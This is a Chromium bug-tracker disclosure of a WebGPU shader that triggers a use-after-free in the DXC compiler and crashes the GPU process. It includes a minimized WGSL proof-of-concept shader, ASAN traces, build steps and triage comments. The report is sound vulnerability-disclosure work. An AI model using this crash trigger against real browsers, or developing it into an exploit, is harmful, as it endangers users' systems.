# GPU process crash via WebGPU shader - placeSplitBlockCarefully in LoopSimplify.cpp

| Field | Value |
|-------|-------|
| **Issue ID** | [333508731](https://issues.chromium.org/issues/333508731) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>WebGPU, Dawn>Tint, Internals>GPU>Dawn, Internals>GPU>Tint |
| **Platforms** | Linux, Windows, ChromeOS |
| **Reporter** | wg...@gmail.com |
| **Assignee** | am...@google.com |
| **Created** | 2024-04-09 |
| **Bounty** | $10,000.00 |

## Description

VULNERABILITY DETAILS

Chromium translates wgsl shaders via tint to an OS-specific shader format. On Windows, the OS-specific file format is hlsl, processed in dxcompiler.dll. When compiling chrome-generated hlsl files, this might trigger a heap UAF insider the hlsl compiler.
The actual ASAN violation is highly dependent on the input, reduced testcases sometimes trigger an UAF, OOB, or a near-null-deref.

VERSION Chrome Version: Pre-compiled ASAN Chromium 125.0.6406.0 (Developer Build) (64-bit) Operating System: Win10 Build 19045

REPRODUCTION CASE Attached is a .html file containing a WebGPU shader. Opening the html file (on windows with the D3D12 backend) crashes the GPU process. The html crashes with an UAF access.
The following shader is suitable for standalone compilation on linux with an asan-dxc, it triggers an OOB. This minimized version also crashes the GPU process, but for some reason no ASAN report is generated. Further reducing this standalone shader is possible, but the crash type changes from OOB to null-deref.

```
struct t {
    m: vec2<f32>,
}

@group(0) @binding(0) 
var<uniform> g: t;

fn f() {
    var l: i32;
    var l_1: i32;
    var l_2: i32; 
    var l_3: i32;
    var l_4: i32;
    var l_5: i32;
    var l_6: array<f32, 9>;

    loop {
        let x_45_ = l;
        let x_47_ = g.m.x;
        let _e20 = i32(x_47_);
        let _e21 = (x_45_ >= _e20);
        if _e21 {
            break;
        }
        let x_53_ = g.m.y;
        l_5 = _e20;
        let _e44 = array<f32, 9>(x_53_, x_53_, x_53_, x_47_, x_53_, x_47_, x_47_, x_53_, x_47_);
        let _e43 = ~(_e20);
        l_1 = 2;
        loop {
            if _e21 {
                if (!_e21) {
                    return;
                } 
                switch (_e20 * _e20) {
                    case 1: {
                        return;
                    }
                    case 2: {
                        return;
                    }
                    default: {
                    }
                }
            }
loop {
                continuing {
                    l_1 = ~(x_45_);
                    break if _e21;
                }
            }
            if (l_1 <= 4) {
                break;
            }
            l_2 = 2;
        }
        let x_111_ = l;
        l = (x_111_ + 1);
        continuing {
            let x_113_ = l;
            break if !((x_113_ >= 200));
        }
    }
}

@fragment
fn main() -> @location(0) vec4<f32> {
    loop {
        f();
        f();
        continuing {
            break if (1 < 1);
        }
    }
    return vec4<f32>();
}

```
```
==7092==ERROR: AddressSanitizer: heap-use-after-free on address 0x12351b5dfa30 at pc 0x7ffd8a7d9934 bp 0x003b6cbfb8a0 sp 0x003b6cbfb8e8
READ of size 8 at 0x12351b5dfa30 thread T0
==7092==WARNING: Failed to use and restart external symbolizer!
==7092==*** WARNING: Failed to initialize DbgHelp!              ***
==7092==*** Most likely this means that the app is already      *** 
==7092==*** using DbgHelp, possibly with incompatible flags.    *** 
==7092==*** Due to technical reasons, symbolization might crash *** 
==7092==*** or produce wrong results.                           ***
[4260:2876:0409/090757.581:WARNING:dns_config_service_win.cc(606)] Failed to read DnsConfig.
    #0 0x7ffd8a7d9933 in llvm::BasicBlock::moveAfter C:\b\s\w\ir\cache\builder\src\third_party\dawn\third_party\dxc\lib\IR\BasicBlock.cpp:118
    #1 0x7ffd8b75f818 in llvm::InsertPreheaderForLoop C:\b\s\w\ir\cache\builder\src\third_party\dawn\third_party\dxc\lib\Transforms\Utils\LoopSimplify.cpp:153
    #2 0x7ffd8b760ffd in llvm::simplifyLoop C:\b\s\w\ir\cache\builder\src\third_party\dawn\third_party\dxc\lib\Transforms\Utils\LoopSimplify.cpp:740
    #3 0x7ffd8b76ac9d in llvm::UnrollLoop C:\b\s\w\ir\cache\builder\src\third_party\dawn\third_party\dxc\lib\Transforms\Utils\LoopUnroll.cpp:544
    #4 0x7ffd8ac3891a in `anonymous namespace'::LoopUnroll::runOnLoop C:\b\s\w\ir\cache\builder\src\third_party\dawn\third_party\dxc\lib\Transforms\Scalar\LoopUnrollPass.cpp:946
    #5 0x7ffd8b7777cb in llvm::LPPassManager::runOnFunction C:\b\s\w\ir\cache\builder\src\third_party\dawn\third_party\dxc\lib\Analysis\LoopPass.cpp:251
    #6 0x7ffd89942fc4 in llvm::FPPassManager::runOnFunction C:\b\s\w\ir\cache\builder\src\third_party\dawn\third_party\dxc\lib\IR\LegacyPassManager.cpp:1587
    #7 0x7ffd89943a5e in llvm::FPPassManager::runOnModule C:\b\s\w\ir\cache\builder\src\third_party\dawn\third_party\dxc\lib\IR\LegacyPassManager.cpp:1609
    #8 0x7ffd89944715 in llvm::legacy::PassManagerImpl::run C:\b\s\w\ir\cache\builder\src\third_party\dawn\third_party\dxc\lib\IR\LegacyPassManager.cpp:1771
    #9 0x7ffd8994da2c in clang::EmitBackendOutput C:\b\s\w\ir\cache\builder\src\third_party\dawn\third_party\dxc\tools\clang\lib\CodeGen\BackendUtil.cpp:779
    #10 0x7ffd89360801 in clang::BackendConsumer::HandleTranslationUnit C:\b\s\w\ir\cache\builder\src\third_party\dawn\third_party\dxc\tools\clang\lib\CodeGen\CodeGenAction.cpp:191
    #11 0x7ffd89a79511 in clang::ParseAST C:\b\s\w\ir\cache\builder\src\third_party\dawn\third_party\dxc\tools\clang\lib\Parse\ParseAST.cpp:164
    #12 0x7ffd8935b4f2 in clang::CodeGenAction::ExecuteAction C:\b\s\w\ir\cache\builder\src\third_party\dawn\third_party\dxc\tools\clang\lib\CodeGen\CodeGenAction.cpp:807
    #13 0x7ffd89368c23 in clang::FrontendAction::Execute C:\b\s\w\ir\cache\builder\src\third_party\dawn\third_party\dxc\tools\clang\lib\Frontend\FrontendAction.cpp:455
    #14 0x7ffd89246b56 in DxcCompiler::Compile C:\b\s\w\ir\cache\builder\src\third_party\dawn\third_party\dxc\tools\clang\tools\dxcompiler\dxcompilerobj.cpp:982
    #15 0x7ffd918d0a75 in dawn::native::d3d::CompileShader C:\b\s\w\ir\cache\builder\src\third_party\dawn\src\dawn\native\d3d\ShaderUtils.cpp:355
    #16 0x7ffd91930f7e in dawn::native::LoadOrRun<dawn::Result<dawn::native::d3d::CompiledShader,dawn::native::ErrorData> (*)(dawn::native::Blob),dawn::Result<dawn::native::d3d::CompiledShader,dawn::native::ErrorData> (*)(dawn::native::d3d::D3DCompilationRequest)> C:\b\s\w\ir\cache\builder\src\third_party\dawn\src\dawn\native\CacheRequest.h:154
    #17 0x7ffd919d92e4 in dawn::native::d3d12::ShaderModule::Compile C:\b\s\w\ir\cache\builder\src\third_party\dawn\src\dawn\native\d3d12\ShaderModuleD3D12.cpp:379
    #18 0x7ffd919c2b10 in dawn::native::d3d12::RenderPipeline::InitializeImpl C:\b\s\w\ir\cache\builder\src\third_party\dawn\src\dawn\native\d3d12\RenderPipelineD3D12.cpp:383
    #19 0x7ffd917fac50 in dawn::native::PipelineBase::Initialize C:\b\s\w\ir\cache\builder\src\third_party\dawn\src\dawn\native\Pipeline.cpp:371
    #20 0x7ffd91754c7e in dawn::native::DeviceBase::CreateRenderPipeline C:\b\s\w\ir\cache\builder\src\third_party\dawn\src\dawn\native\Device.cpp:2049
    #21 0x7ffd91754681 in dawn::native::DeviceBase::APICreateRenderPipeline C:\b\s\w\ir\cache\builder\src\third_party\dawn\src\dawn\native\Device.cpp:1363
    #22 0x7ffdb37f6bad in dawn::wire::server::Server::DoDeviceCreateRenderPipeline C:\b\s\w\ir\cache\builder\src\out\Release_x64\gen\third_party\dawn\src\dawn\wire\server\ServerDoers_autogen.cpp:314
    #23 0x7ffdb31f2584 in dawn::wire::server::Server::HandleDeviceCreateRenderPipeline C:\b\s\w\ir\cache\builder\src\out\Release_x64\gen\third_party\dawn\src\dawn\wire\server\ServerHandlers_autogen.cpp:606
    #24 0x7ffdb31f78ac in dawn::wire::server::Server::HandleCommandsImpl C:\b\s\w\ir\cache\builder\src\out\Release_x64\gen\third_party\dawn\src\dawn\wire\server\ServerHandlers_autogen.cpp:1642
    #25 0x7ffdaedcbdc2 in gpu::webgpu::`anonymous namespace'::DawnWireServer::HandleCommands C:\b\s\w\ir\cache\builder\src\gpu\command_buffer\service\webgpu_decoder_impl.cc:999
    #26 0x7ffdaedcc215 in gpu::webgpu::`anonymous namespace'::WebGPUDecoderImpl::HandleDawnCommands C:\b\s\w\ir\cache\builder\src\gpu\command_buffer\service\webgpu_decoder_impl.cc:1908
    #27 0x7ffdaedc0041 in gpu::webgpu::`anonymous namespace'::WebGPUDecoderImpl::DoCommands C:\b\s\w\ir\cache\builder\src\gpu\command_buffer\service\webgpu_decoder_impl.cc:1853
    #28 0x7ffda2b7e273 in gpu::CommandBufferService::Flush C:\b\s\w\ir\cache\builder\src\gpu\command_buffer\service\command_buffer_service.cc:232
    #29 0x7ffd9f7cfddc in gpu::CommandBufferStub::OnAsyncFlush C:\b\s\w\ir\cache\builder\src\gpu\ipc\service\command_buffer_stub.cc:507
    #30 0x7ffd9f7ce883 in gpu::CommandBufferStub::ExecuteDeferredRequest C:\b\s\w\ir\cache\builder\src\gpu\ipc\service\command_buffer_stub.cc:155
    #31 0x7ffda2b9c1c5 in gpu::GpuChannel::ExecuteDeferredRequest C:\b\s\w\ir\cache\builder\src\gpu\ipc\service\gpu_channel.cc:888
    #32 0x7ffda2bac52a in base::internal::Invoker<base::internal::FunctorTraits<void (gpu::GpuChannel::*&&)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>),base::WeakPtr<gpu::GpuChannel> &&,mojo::StructPtr<gpu::mojom::DeferredRequestParams> &&>,base::internal::BindState<1,1,0,void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>),base::WeakPtr<gpu::GpuChannel>,mojo::StructPtr<gpu::mojom::DeferredRequestParams> >,void ()>::RunOnce C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:980
    #33 0x7ffda21c54bc in gpu::SchedulerDfs::ExecuteSequence C:\b\s\w\ir\cache\builder\src\gpu\command_buffer\service\scheduler_dfs.cc:740
    #34 0x7ffda21c37e8 in gpu::SchedulerDfs::RunNextTask C:\b\s\w\ir\cache\builder\src\gpu\command_buffer\service\scheduler_dfs.cc:665
    #35 0x7ffda21c6b68 in base::internal::Invoker<base::internal::FunctorTraits<void (gpu::SchedulerDfs::*&&)(),gpu::SchedulerDfs *>,base::internal::BindState<1,1,0,void (gpu::SchedulerDfs::*)(),base::internal::UnretainedWrapper<gpu::SchedulerDfs,base::unretained_traits::MayNotDangle,0> >,void ()>::RunOnce C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:980
    #36 0x7ffd9d6f09e0 in base::TaskAnnotator::RunTaskImpl C:\b\s\w\ir\cache\builder\src\base\task\common\task_annotator.cc:203
    #37 0x7ffda0ff5426 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl C:\b\s\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:473
    #38 0x7ffda0ff4349 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork C:\b\s\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:338
    #39 0x7ffda102a26e in base::MessagePumpDefault::Run C:\b\s\w\ir\cache\builder\src\base\message_loop\message_pump_default.cc:40
    #40 0x7ffda0ff715c in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run C:\b\s\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:641
    #41 0x7ffd9d73b7f0 in base::RunLoop::Run C:\b\s\w\ir\cache\builder\src\base\run_loop.cc:134
    #42 0x7ffda0522f7b in content::GpuMain C:\b\s\w\ir\cache\builder\src\content\gpu\gpu_main.cc:436
    #43 0x7ffd9c0050e2 in content::RunOtherNamedProcessTypeMain C:\b\s\w\ir\cache\builder\src\content\app\content_main_runner_impl.cc:771
    #44 0x7ffd9c007663 in content::ContentMainRunnerImpl::Run C:\b\s\w\ir\cache\builder\src\content\app\content_main_runner_impl.cc:1146
    #45 0x7ffd9c0031aa in content::RunContentProcess C:\b\s\w\ir\cache\builder\src\content\app\content_main.cc:329
    #46 0x7ffd9c003b6d in content::ContentMain C:\b\s\w\ir\cache\builder\src\content\app\content_main.cc:342
    #47 0x7ffd8f2716c3 in ChromeMain C:\b\s\w\ir\cache\builder\src\chrome\app\chrome_main.cc:192
    #48 0x7ff6d5c243c6 in MainDllLoader::Launch C:\b\s\w\ir\cache\builder\src\chrome\app\main_dll_loader_win.cc:180
    #49 0x7ff6d5c21dc0 in main C:\b\s\w\ir\cache\builder\src\chrome\app\chrome_exe_main_win.cc:350
    #50 0x7ff6d6003913 in __scrt_common_main_seh D:\a\_work\1\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl:288
    #51 0x7ffde8037613 in BaseThreadInitThunk+0x13 (C:\Windows\System32\KERNEL32.DLL+0x180017613)
    #52 0x7ffde99c26a0 in RtlUserThreadStart+0x20 (C:\Windows\SYSTEM32\ntdll.dll+0x1800526a0)

0x12351b5dfa30 is located 14384 bytes inside of 17184-byte region [0x12351b5dc200,0x12351b5e0520)
freed by thread T0 here:
    #0 0x7ff6d5cff03d in free C:\b\s\w\ir\cache\builder\src\third_party\llvm\compiler-rt\lib\asan\asan_malloc_win.cpp:82
    #1 0x7ffd89368f42 in clang::FrontendAction::EndSourceFile C:\b\s\w\ir\cache\builder\src\third_party\dawn\third_party\dxc\tools\clang\lib\Frontend\FrontendAction.cpp:494
    #2 0x7ffd89246b6a in DxcCompiler::Compile C:\b\s\w\ir\cache\builder\src\third_party\dawn\third_party\dxc\tools\clang\tools\dxcompiler\dxcompilerobj.cpp:983
    #3 0x7ffd918d0a75 in dawn::native::d3d::CompileShader C:\b\s\w\ir\cache\builder\src\third_party\dawn\src\dawn\native\d3d\ShaderUtils.cpp:355
    #4 0x7ffd91930f7e in dawn::native::LoadOrRun<dawn::Result<dawn::native::d3d::CompiledShader,dawn::native::ErrorData> (*)(dawn::native::Blob),dawn::Result<dawn::native::d3d::CompiledShader,dawn::native::ErrorData> (*)(dawn::native::d3d::D3DCompilationRequest)> C:\b\s\w\ir\cache\builder\src\third_party\dawn\src\dawn\native\CacheRequest.h:154
    #5 0x7ffd919d92e4 in dawn::native::d3d12::ShaderModule::Compile C:\b\s\w\ir\cache\builder\src\third_party\dawn\src\dawn\native\d3d12\ShaderModuleD3D12.cpp:379
    #6 0x7ffd919c2b10 in dawn::native::d3d12::RenderPipeline::InitializeImpl C:\b\s\w\ir\cache\builder\src\third_party\dawn\src\dawn\native\d3d12\RenderPipelineD3D12.cpp:383
    #7 0x7ffd917fac50 in dawn::native::PipelineBase::Initialize C:\b\s\w\ir\cache\builder\src\third_party\dawn\src\dawn\native\Pipeline.cpp:371
    #8 0x7ffd91754c7e in dawn::native::DeviceBase::CreateRenderPipeline C:\b\s\w\ir\cache\builder\src\third_party\dawn\src\dawn\native\Device.cpp:2049
    #9 0x7ffd91754681 in dawn::native::DeviceBase::APICreateRenderPipeline C:\b\s\w\ir\cache\builder\src\third_party\dawn\src\dawn\native\Device.cpp:1363
    #10 0x7ffdb37f6bad in dawn::wire::server::Server::DoDeviceCreateRenderPipeline C:\b\s\w\ir\cache\builder\src\out\Release_x64\gen\third_party\dawn\src\dawn\wire\server\ServerDoers_autogen.cpp:314
    #11 0x7ffdb31f2584 in dawn::wire::server::Server::HandleDeviceCreateRenderPipeline C:\b\s\w\ir\cache\builder\src\out\Release_x64\gen\third_party\dawn\src\dawn\wire\server\ServerHandlers_autogen.cpp:606
    #12 0x7ffdb31f78ac in dawn::wire::server::Server::HandleCommandsImpl C:\b\s\w\ir\cache\builder\src\out\Release_x64\gen\third_party\dawn\src\dawn\wire\server\ServerHandlers_autogen.cpp:1642
    #13 0x7ffdaedcbdc2 in gpu::webgpu::`anonymous namespace'::DawnWireServer::HandleCommands C:\b\s\w\ir\cache\builder\src\gpu\command_buffer\service\webgpu_decoder_impl.cc:999
    #14 0x7ffdaedcc215 in gpu::webgpu::`anonymous namespace'::WebGPUDecoderImpl::HandleDawnCommands C:\b\s\w\ir\cache\builder\src\gpu\command_buffer\service\webgpu_decoder_impl.cc:1908
    #15 0x7ffdaedc0041 in gpu::webgpu::`anonymous namespace'::WebGPUDecoderImpl::DoCommands C:\b\s\w\ir\cache\builder\src\gpu\command_buffer\service\webgpu_decoder_impl.cc:1853
    #16 0x7ffda2b7e273 in gpu::CommandBufferService::Flush C:\b\s\w\ir\cache\builder\src\gpu\command_buffer\service\command_buffer_service.cc:232
    #17 0x7ffd9f7cfddc in gpu::CommandBufferStub::OnAsyncFlush C:\b\s\w\ir\cache\builder\src\gpu\ipc\service\command_buffer_stub.cc:507
    #18 0x7ffd9f7ce883 in gpu::CommandBufferStub::ExecuteDeferredRequest C:\b\s\w\ir\cache\builder\src\gpu\ipc\service\command_buffer_stub.cc:155
    #19 0x7ffda2b9c1c5 in gpu::GpuChannel::ExecuteDeferredRequest C:\b\s\w\ir\cache\builder\src\gpu\ipc\service\gpu_channel.cc:888
    #20 0x7ffda2bac52a in base::internal::Invoker<base::internal::FunctorTraits<void (gpu::GpuChannel::*&&)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>),base::WeakPtr<gpu::GpuChannel> &&,mojo::StructPtr<gpu::mojom::DeferredRequestParams> &&>,base::internal::BindState<1,1,0,void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>),base::WeakPtr<gpu::GpuChannel>,mojo::StructPtr<gpu::mojom::DeferredRequestParams> >,void ()>::RunOnce C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:980
    #21 0x7ffda21c54bc in gpu::SchedulerDfs::ExecuteSequence C:\b\s\w\ir\cache\builder\src\gpu\command_buffer\service\scheduler_dfs.cc:740
    #22 0x7ffda21c37e8 in gpu::SchedulerDfs::RunNextTask C:\b\s\w\ir\cache\builder\src\gpu\command_buffer\service\scheduler_dfs.cc:665
    #23 0x7ffda21c6b68 in base::internal::Invoker<base::internal::FunctorTraits<void (gpu::SchedulerDfs::*&&)(),gpu::SchedulerDfs *>,base::internal::BindState<1,1,0,void (gpu::SchedulerDfs::*)(),base::internal::UnretainedWrapper<gpu::SchedulerDfs,base::unretained_traits::MayNotDangle,0> >,void ()>::RunOnce C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:980
    #24 0x7ffd9d6f09e0 in base::TaskAnnotator::RunTaskImpl C:\b\s\w\ir\cache\builder\src\base\task\common\task_annotator.cc:203
    #25 0x7ffda0ff5426 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl C:\b\s\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:473
    #26 0x7ffda0ff4349 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork C:\b\s\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:338
    #27 0x7ffda102a26e in base::MessagePumpDefault::Run C:\b\s\w\ir\cache\builder\src\base\message_loop\message_pump_default.cc:40

previously allocated by thread T0 here:
    #0 0x7ff6d5cff13d in malloc C:\b\s\w\ir\cache\builder\src\third_party\llvm\compiler-rt\lib\asan\asan_malloc_win.cpp:98
    #1 0x7ffd8bd551ce in operator new D:\a\_work\1\s\src\vctools\crt\vcstartup\src\heap\new_scalar.cpp:36
    #2 0x7ffd89375f25 in clang::CompilerInstance::createASTContext C:\b\s\w\ir\cache\builder\src\third_party\dawn\third_party\dxc\tools\clang\lib\Frontend\CompilerInstance.cpp:414
    #3 0x7ffd89367e84 in clang::FrontendAction::BeginSourceFile C:\b\s\w\ir\cache\builder\src\third_party\dawn\third_party\dxc\tools\clang\lib\Frontend\FrontendAction.cpp:326
    #4 0x7ffd89246b3e in DxcCompiler::Compile C:\b\s\w\ir\cache\builder\src\third_party\dawn\third_party\dxc\tools\clang\tools\dxcompiler\dxcompilerobj.cpp:981
    #5 0x7ffd918d0a75 in dawn::native::d3d::CompileShader C:\b\s\w\ir\cache\builder\src\third_party\dawn\src\dawn\native\d3d\ShaderUtils.cpp:355
    #6 0x7ffd91930f7e in dawn::native::LoadOrRun<dawn::Result<dawn::native::d3d::CompiledShader,dawn::native::ErrorData> (*)(dawn::native::Blob),dawn::Result<dawn::native::d3d::CompiledShader,dawn::native::ErrorData> (*)(dawn::native::d3d::D3DCompilationRequest)> C:\b\s\w\ir\cache\builder\src\third_party\dawn\src\dawn\native\CacheRequest.h:154
    #7 0x7ffd919d92e4 in dawn::native::d3d12::ShaderModule::Compile C:\b\s\w\ir\cache\builder\src\third_party\dawn\src\dawn\native\d3d12\ShaderModuleD3D12.cpp:379
    #8 0x7ffd919c2b10 in dawn::native::d3d12::RenderPipeline::InitializeImpl C:\b\s\w\ir\cache\builder\src\third_party\dawn\src\dawn\native\d3d12\RenderPipelineD3D12.cpp:383
    #9 0x7ffd917fac50 in dawn::native::PipelineBase::Initialize C:\b\s\w\ir\cache\builder\src\third_party\dawn\src\dawn\native\Pipeline.cpp:371
    #10 0x7ffd91754c7e in dawn::native::DeviceBase::CreateRenderPipeline C:\b\s\w\ir\cache\builder\src\third_party\dawn\src\dawn\native\Device.cpp:2049
    #11 0x7ffd91754681 in dawn::native::DeviceBase::APICreateRenderPipeline C:\b\s\w\ir\cache\builder\src\third_party\dawn\src\dawn\native\Device.cpp:1363
    #12 0x7ffdb37f6bad in dawn::wire::server::Server::DoDeviceCreateRenderPipeline C:\b\s\w\ir\cache\builder\src\out\Release_x64\gen\third_party\dawn\src\dawn\wire\server\ServerDoers_autogen.cpp:314
    #13 0x7ffdb31f2584 in dawn::wire::server::Server::HandleDeviceCreateRenderPipeline C:\b\s\w\ir\cache\builder\src\out\Release_x64\gen\third_party\dawn\src\dawn\wire\server\ServerHandlers_autogen.cpp:606
    #14 0x7ffdb31f78ac in dawn::wire::server::Server::HandleCommandsImpl C:\b\s\w\ir\cache\builder\src\out\Release_x64\gen\third_party\dawn\src\dawn\wire\server\ServerHandlers_autogen.cpp:1642
    #15 0x7ffdaedcbdc2 in gpu::webgpu::`anonymous namespace'::DawnWireServer::HandleCommands C:\b\s\w\ir\cache\builder\src\gpu\command_buffer\service\webgpu_decoder_impl.cc:999
    #16 0x7ffdaedcc215 in gpu::webgpu::`anonymous namespace'::WebGPUDecoderImpl::HandleDawnCommands C:\b\s\w\ir\cache\builder\src\gpu\command_buffer\service\webgpu_decoder_impl.cc:1908
    #17 0x7ffdaedc0041 in gpu::webgpu::`anonymous namespace'::WebGPUDecoderImpl::DoCommands C:\b\s\w\ir\cache\builder\src\gpu\command_buffer\service\webgpu_decoder_impl.cc:1853
    #18 0x7ffda2b7e273 in gpu::CommandBufferService::Flush C:\b\s\w\ir\cache\builder\src\gpu\command_buffer\service\command_buffer_service.cc:232
    #19 0x7ffd9f7cfddc in gpu::CommandBufferStub::OnAsyncFlush C:\b\s\w\ir\cache\builder\src\gpu\ipc\service\command_buffer_stub.cc:507
    #20 0x7ffd9f7ce883 in gpu::CommandBufferStub::ExecuteDeferredRequest C:\b\s\w\ir\cache\builder\src\gpu\ipc\service\command_buffer_stub.cc:155
    #21 0x7ffda2b9c1c5 in gpu::GpuChannel::ExecuteDeferredRequest C:\b\s\w\ir\cache\builder\src\gpu\ipc\service\gpu_channel.cc:888
    #22 0x7ffda2bac52a in base::internal::Invoker<base::internal::FunctorTraits<void (gpu::GpuChannel::*&&)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>),base::WeakPtr<gpu::GpuChannel> &&,mojo::StructPtr<gpu::mojom::DeferredRequestParams> &&>,base::internal::BindState<1,1,0,void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>),base::WeakPtr<gpu::GpuChannel>,mojo::StructPtr<gpu::mojom::DeferredRequestParams> >,void ()>::RunOnce C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:980
    #23 0x7ffda21c54bc in gpu::SchedulerDfs::ExecuteSequence C:\b\s\w\ir\cache\builder\src\gpu\command_buffer\service\scheduler_dfs.cc:740
    #24 0x7ffda21c37e8 in gpu::SchedulerDfs::RunNextTask C:\b\s\w\ir\cache\builder\src\gpu\command_buffer\service\scheduler_dfs.cc:665
    #25 0x7ffda21c6b68 in base::internal::Invoker<base::internal::FunctorTraits<void (gpu::SchedulerDfs::*&&)(),gpu::SchedulerDfs *>,base::internal::BindState<1,1,0,void (gpu::SchedulerDfs::*)(),base::internal::UnretainedWrapper<gpu::SchedulerDfs,base::unretained_traits::MayNotDangle,0> >,void ()>::RunOnce C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:980
    #26 0x7ffd9d6f09e0 in base::TaskAnnotator::RunTaskImpl C:\b\s\w\ir\cache\builder\src\base\task\common\task_annotator.cc:203
    #27 0x7ffda0ff5426 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl C:\b\s\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:473

SUMMARY: AddressSanitizer: heap-use-after-free C:\b\s\w\ir\cache\builder\src\third_party\dawn\third_party\dxc\lib\IR\BasicBlock.cpp:118 in llvm::BasicBlock::moveAfter
Shadow bytes around the buggy address:
  0x12351b5df780: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x12351b5df800: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x12351b5df880: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x12351b5df900: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x12351b5df980: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
=>0x12351b5dfa00: fd fd fd fd fd fd[fd]fd fd fd fd fd fd fd fd fd
  0x12351b5dfa80: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x12351b5dfb00: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x12351b5dfb80: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x12351b5dfc00: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x12351b5dfc80: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb

==7092==ADDITIONAL INFO

==7092==Note: Please include this section with the ASan report.
Task trace:
    #0 0x7ffda21c398e in gpu::SchedulerDfs::RunNextTask C:\b\s\w\ir\cache\builder\src\gpu\command_buffer\service\scheduler_dfs.cc:681
    #1 0x7ffda21bc8e5 in gpu::SchedulerDfs::TryScheduleSequence C:\b\s\w\ir\cache\builder\src\gpu\command_buffer\service\scheduler_dfs.cc:480


MiraclePtr Status: NOT PROTECTED
No raw_ptr<T> access to this region was detected prior to this crash.
This crash is still exploitable with MiraclePtr.
Refer to https://chromium.googlesource.com/chromium/src/+/main/base/memory/raw_ptr.md for details.

==7092==END OF ADDITIONAL INFO
==7092==ABORTING

```

## Attachments

- [indexCarefully2.html](attachments/indexCarefully2.html) (text/html, 8.1 KB)
- [c.hlsl](attachments/c.hlsl) (application/octet-stream, 1.6 KB)

## Timeline

### cl...@appspot.gserviceaccount.com (2024-04-09)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6211599019737088.

### an...@chromium.org (2024-04-09)

Hi @am...@google.com, assigning to you due to similarities with <https://issues.chromium.org/331123811>. Please re-route if necessary.

### an...@chromium.org (2024-04-09)

Setting FoundIn to M122 provisionally based on code commit dates.

### wg...@gmail.com (2024-04-09)

Reproduces standalone on linux on dxc commit 14ec4b49d419195b787d41464d4a4489bba87bb2. The hlsl shader has been generated via tint (from dawn commit 3de0f00ef217d7fbce7f5397d1b8f1c52372b9cd). I'm attaching the hlsl file generated by tint.
`./dxc-3.7 c.hlsl -T ps_6_2`

### am...@google.com (2024-04-09)

> Reproduces standalone on linux on dxc commit 14ec4b49d419195b787d41464d4a4489bba87bb2. The hlsl shader has been generated via tint (from dawn commit 3de0f00ef217d7fbce7f5397d1b8f1c52372b9cd). I'm attaching the hlsl file generated by tint. ./dxc-3.7 c.hlsl -T ps\_6\_2

[wgslfuzz@gmail.com](mailto:wgslfuzz@gmail.com), how are you building DXC? Are you building using CMake from the official upstream repo? Or are you building in Dawn using gn or CMake?

### wg...@gmail.com (2024-04-10)

I'm building dxc from the official upstream at <https://github.com/microsoft/DirectXShaderCompiler.git>

```
cd DirectXShaderCompiler
mkdir out/build
cd out/build
CC=clang-17 CXX=clang++-17 cmake ../../ -C ../../cmake/caches/PredefinedParams.cmake -DCMAKE_BUILD_TYPE=RelWithDebInfo -DDXC_DISABLE_ALLOCATOR_OVERRIDES=ON -DENABLE_SPIRV_CODEGEN=OFF -DSPIRV_BUILD_TESTS=OFF -DLLVM_USE_SANITIZER=Address -DLLVM_ENABLE_LTO=Thin -G Ninja
ninja

```

Testing the latest upstream commit 0781ded87bd78c11f208bc206a35ea3830b31ae1 reproduces the crash locally when invoking `./dxc-3.7 c.hlsl -T ps_6_2`

### pe...@google.com (2024-04-10)

Setting milestone because of s0/s1 severity.

### am...@google.com (2024-04-18)

